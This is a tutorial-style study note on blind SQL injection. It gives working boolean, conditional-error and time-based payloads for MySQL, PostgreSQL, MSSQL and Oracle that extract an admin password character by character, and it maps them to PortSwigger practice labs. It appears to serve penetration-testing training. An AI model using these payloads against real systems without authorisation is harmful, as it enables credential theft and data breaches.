# Blind SQL Injection — Boolean-Based & Time-Based

## 1. Why "Blind"

No data is reflected in the HTTP response and no DB error is shown. The only signal you get
is an indirect one: a difference in page content/length, HTTP status code, or response timing.
This is the most common real-world scenario against hardened production apps — generic error
pages are standard practice, so assume blind first on any modern target.

## 2. Boolean-Based Blind SQLi

### 2.1 Core Mechanism
Inject a condition that is provably true or false, and observe whether the application's
behavior changes (e.g., "Welcome back" vs. nothing, 200 vs. 302, a longer vs. shorter page).

### 2.2 Confirming the Injection Point

```sql
' AND 1=1--
' AND 1=2--
```

Breakdown:
- `AND 1=1` — a condition that is always true; appended to the original `WHERE` clause it
  should not change the original result set's truth value, so the page should render
  identically to a baseline request with no payload.
- `AND 1=2` — always false; if this consistently produces a *different* response (different
  page, empty result, redirect) than the `1=1` case, you've confirmed the input is reaching
  a live, executable `WHERE` clause — i.e., the injection point is real and exploitable.
- `--` — comments out any trailing original SQL so the modified query remains valid.

### 2.3 Extracting Data One Bit/Character At A Time

**Step 1 — confirm table/column exists:**

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

Breakdown:
- `(SELECT 'a' FROM users LIMIT 1)` — a subquery that only succeeds (returns a row) if the
  `users` table exists and contains at least one row; `LIMIT 1` keeps it to a single
  comparable value as required by the `=` operator.
- `='a'` — compares the subquery's literal output against the same literal; this isn't really
  testing data, it's testing whether the subquery *executes without error*, confirming the
  table exists and is non-empty.
' AND (SELECT CHAR_LENGTH(password) FROM users WHERE username='admin')=8-- -


**Step 1.1 — confirm table/columns length**

```sql
' AND (SELECT CHAR_LENGTH(password) FROM users WHERE username='admin')=8-- -

```


**Step 2 — extract data character by character using `SUBSTRING`:**

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
```

Breakdown:
- `SUBSTRING(string, start, length)` — extracts a portion of the password value: starting at
  position `1`, taking `1` character.
- `(SELECT password FROM users WHERE username='admin')` — the subquery target: the password
  belonging to a specific known user, narrowed by the `WHERE` filter so it returns exactly one
  value (required, since `SUBSTRING` can't operate on multiple rows).
- `='a'` — the guess. If the response matches the "true" baseline behavior, character 1 of
  the password is `a`. Iterate through the alphabet/charset for position 1, then increment
  the start position (`2`, `3`, ...) and repeat until a guess returns no character (end of
  string reached), and you've extracted the full password.
- In practice this is automated (Burp Intruder cluster bomb, or sqlmap — see file 07), never
  done manually character-by-character on a real engagement — included here purely so the
  underlying mechanism is understood before automating it.

**Binary search variant (faster than linear character guessing) using `ASCII`:**

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>109--
```

Breakdown:
- `ASCII(char)` — converts the extracted single character into its numeric ASCII code,
  enabling numeric comparison instead of testing 26+ individual letter guesses per position.
- `>109` — a midpoint guess (109 = ASCII `m`); halving the remaining range each time
  (binary search) finds the exact character in ~7 requests instead of up to 95 (full
  printable ASCII range), versus a linear scan.

PortSwigger lab mapping (Practitioner): **"Blind SQL injection with conditional responses"**,
**"Blind SQL injection with conditional errors"**.

## 3. Boolean-Based — Conditional Errors Variant

### 3.1 When To Use It

Used when the application does not show visible content differences between TRUE and FALSE conditions, but database errors cause a distinguishable generic HTTP 500 response.

Instead of relying on page content, deliberately trigger a database error depending on whether a tested condition is TRUE or FALSE.

### 3.2 Core Payload

```sql
' AND (SELECT CASE
    WHEN (1=1) THEN 1/0
    ELSE 1
END)--
```

**Breakdown:**

- `CASE WHEN condition THEN x ELSE y END` — evaluates a condition and returns the corresponding expression.
- `WHEN (1=1)` — the condition being tested. Replace this with an actual data-dependent condition.
- `THEN 1/0` — deliberately triggers a division-by-zero error when the condition is TRUE.
- `ELSE 1` — returns a harmless value when the condition is FALSE.
- `--` — comments out the remaining part of the original SQL statement.

### 3.3 TRUE vs FALSE Testing

**TRUE condition:**

```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
```

Expected behavior: Database error, potentially resulting in HTTP 500.

**FALSE condition:**

```sql
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)--
```

Expected behavior: No deliberate division-by-zero error.

If the application consistently produces different responses for these two conditions, the error-based Boolean signal can be used to infer database information.

### 3.4 Extracting Data Using Conditional Errors

The same character-by-character extraction logic used in Boolean-based conditional responses can be applied here.

**Example — Check whether the first character of a password is `a`:**

```sql
' AND (SELECT CASE
    WHEN SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
    THEN 1/0
    ELSE 1
END)--
```

**Breakdown:**

- `SELECT password FROM users` — retrieves the password value.
- `WHERE username='admin'` — selects the target user's record.
- `SUBSTRING(...,1,1)` — extracts the first character.
- `='a'` — checks whether the extracted character matches the guess.
- `THEN 1/0` — triggers an error if the guess is correct.
- `ELSE 1` — avoids the deliberate error if the guess is incorrect.

Repeat the process with different character guesses and increment the position to reconstruct the value.

### 3.5 Important Considerations

- Conditional error payloads are DBMS-dependent. The exact error expression and syntax may need adjustment for the target database.
- Division by zero is not guaranteed to behave identically across all database engines and query contexts.
- Some databases or drivers may suppress, transform, or handle errors differently.
- A generic HTTP 500 alone does not prove SQL injection. Confirm that the response difference is repeatable and controlled by the injected condition.
- If both conditions produce identical responses, try another valid error-triggering expression or another SQLi technique.

  
## 4. Time-Based Blind SQLi

### 4.1 When To Use It

Used when there's *no observable difference* between true/false conditions — identical page content, identical status code, identical response length. The only remaining signal is response time, by deliberately injecting a conditional delay.

Unlike Boolean-Based Blind SQLi, where the signal is a content or behavior difference, Time-Based Blind SQLi uses execution time as the signal.

### 4.2 MySQL

```sql
' AND IF(1=1,SLEEP(5),0)--
```

Breakdown:
- `IF(condition, true_value, false_value)` — MySQL's inline conditional function.
- `SLEEP(5)` — pauses query execution for 5 seconds; executed only when the condition (`1=1`) is true. If the HTTP response takes approximately 5 seconds longer than baseline, the condition was likely true.
- `0` — a trivial false-branch value (no delay), so a false condition returns without the intentional delay.
- 5 seconds is chosen to produce a clearer signal distinct from normal network jitter/latency noise. It is a practical starting point, not a universal requirement.

Extracting data via time-based (same `SUBSTRING` logic as Boolean-Based Blind SQLi, but the *signal* is delay instead of content difference):

```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0)--
```

Breakdown: Identical structure to the Boolean-Based character extraction in section 2.3, with the comparison result fed into `IF(...)` so a correct guess triggers a 5-second delay instead of a content change.


### 4.3 PostgreSQL

PostgreSQL uses `pg_sleep(seconds)` as its native time-delay function. Unlike MySQL's `IF()`, PostgreSQL commonly uses `CASE WHEN` for conditional logic.

**A. Stacked Query Context**

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

Breakdown:
- `;` — terminates the original statement and attempts to execute a second SQL statement.
- `CASE WHEN` — evaluates the condition and selects the appropriate branch.
- `pg_sleep(5)` — introduces a 5-second delay when the condition is true.
- `pg_sleep(0)` — introduces no intentional delay when the condition is false.
- This particular structure requires stacked-query support.

**B. String Concatenation Context**

Example from PortSwigger's TrackingId-style injection context:

```sql
'||pg_sleep(5)--
```

Breakdown:
- `||` — PostgreSQL's string concatenation operator. It joins expressions within the existing SQL statement.
- `pg_sleep(5)` — introduces a 5-second delay.
- Unlike the previous example, this does not attempt to start a second SQL statement.
- This approach can work when the injection point is inside a string expression and stacked queries are unavailable, provided the surrounding SQL context accepts the expression.

**Important:** `;` and `||` serve different purposes. `;` separates SQL statements, while `||` concatenates expressions. Neither is universally correct; the original query structure determines which approach is appropriate.

### 4.4 Microsoft SQL Server (MSSQL)

**Basic Conditional Time Delay (Stacked Query)**

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

**Breakdown:**
- `;` — terminates the existing SQL statement and starts another statement.
- `IF (1=1)` — executes the delay only when the condition is true.
- `WAITFOR DELAY '0:0:5'` — pauses execution for 5 seconds.
- `--` — comments out the remaining SQL query.

**Stacked Queries Support:**
- MSSQL supports stacked queries using semicolons (`;`) to separate SQL statements.
- However, whether stacked queries work in an injection point depends on the application's database driver/API and query execution method.
- Therefore, MSSQL support does not guarantee that every injection point allows stacked queries.

**When Stacked Queries Are Not Available**

If the application does not allow multiple statements, use a time-delay expression within the existing SQL statement instead of relying on `;`.

For example, in a suitable string-concatenation context:

```sql
' IF (1=1) WAITFOR DELAY '0:0:5'--
```

**Important:** `WAITFOR DELAY` is a control-flow statement, not a normal scalar function. It cannot simply be inserted into every `SELECT` expression. Unlike PostgreSQL's `pg_sleep()`, MSSQL does not provide an equivalent general-purpose sleep function that can be embedded in a scalar expression.

If stacked queries are blocked, the exact alternative depends on the SQL injection context and query structure. Do not assume the example above will work without verifying the context.

**Key Takeaways:**
- MSSQL time-delay mechanism: `WAITFOR DELAY`
- Stacked query separator: `;`
- Stacked queries are supported by MSSQL, but may be restricted by the application or driver.
- If stacked queries are unavailable, identify an alternative compatible with the existing SQL statement context.

### 4.5 Oracle

Oracle supports several delay primitives. One alternative is `DBMS_PIPE.RECEIVE_MESSAGE()`, which can be used as a value-returning function inside a conditional SQL expression.

```sql
' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END--
```

Breakdown:
- `CASE WHEN (1=1)` — evaluates the condition and selects the appropriate branch.
- `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` — waits for a message on pipe `'a'` for up to 5 seconds.
- `'a'` — the name of the pipe from which the function attempts to receive a message. It is an arbitrary pipe name, not a special keyword.
- `5` — maximum waiting time in seconds.
- `ELSE 0` — returns immediately without an intentional delay when the condition is false.
- `1=` — compares the returned status code with `1`. A timeout typically returns `1`, making the comparison true.

**Expected behavior:**
- True condition → approximately 5 seconds delay, assuming no message arrives.
- False condition → no intentional delay.

**Important:** The `DBMS_PIPE` package must be accessible to the database user. The pipe must also have no incoming message during the test. Package privileges and the surrounding SQL injection context can affect whether this payload works.

Also remember that `DBMS_LOCK.SLEEP()` is a procedure, not a value-returning SQL function, so it cannot be directly used as a `THEN` expression inside a SQL `CASE` statement.

### 4.6 PortSwigger Lab Mapping (Practitioner)

- **Blind SQL injection with time delays**
- **Blind SQL injection with time delays and information retrieval**

## 5. Real-World Notes

- **Common mistake:** Using a delay that's too short (e.g., `SLEEP(1)`) — easily lost in normal network jitter, producing false negatives. 5 seconds is a reasonable starting point; adjust according to baseline latency and response variability.
- **Statistical validation:** Never confirm a time-based SQLi from a single delayed response. Measure baseline response times, compare true and false conditions, and repeat tests to establish a consistent timing difference. This helps eliminate false positives caused by server load, network congestion, or temporary latency.
- **Injection context matters:** A database-specific delay function alone does not guarantee a working payload. The injection context (string, numeric, or other expression context), quote handling, comment syntax, and stacked-query support determine how the function must be integrated into the original SQL statement. For example, PostgreSQL supports both `pg_sleep()` and the `||` concatenation operator, but they serve different purposes.
- **Engagement reality:** Time-based extraction is *slow* — character-by-character over a slow network can take hours for a single column. Use manual testing to confirm the vulnerability and understand its behavior. For authorized extraction, automation tools such as sqlmap can be used when permitted by the engagement scope.
- **Operational risk:** Time-based payloads can degrade application performance for other users if run aggressively (many concurrent threads × multi-second sleeps). Throttle request concurrency during testing windows, especially on client-shared/production environments — note this explicitly in the engagement Rules of Engagement (RoE) and in the report.
- **Report-writing tip:** For blind findings, always include the literal *time delta* observed as evidence. For example:

| Test | Response time |
|---|---:|
| Baseline request | 240 ms |
| False condition | 250 ms |
| True condition | 5,240 ms |

This is more convincing to a technical reviewer than simply stating "time-based blind SQLi confirmed."

## Next File

→ `04-oob-sqli.md` — Out-of-band SQLi via DNS/HTTP exfiltration channels.
